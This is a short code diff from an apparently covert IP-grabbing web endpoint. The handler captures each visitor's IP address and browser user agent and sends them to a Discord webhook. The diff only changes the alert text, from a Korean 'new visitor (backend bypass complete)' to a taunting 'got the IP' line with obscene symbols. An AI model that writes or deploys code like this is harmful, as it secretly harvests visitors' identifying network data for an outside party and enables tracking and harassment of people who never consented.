@@ -22,7 +22,7 @@ async def log_ip(request: Request):
 
     # 디스코드 전송 메시지 구성
     payload = {
-        "content": f"🚨 **새로운 방문자 발생 (백엔드 우회 완료)**\n- **IP 주소:** `{client_ip}`\n- **접속 환경:** `{user_agent}`"
+        "content": f"# **아이피땄다ㅗㅗㅗㅗ**\n- **IP 주소:** `{client_ip}`\n- **접속 환경:** `{user_agent}`"
     }
 
     # 디스코드 웹훅 전송
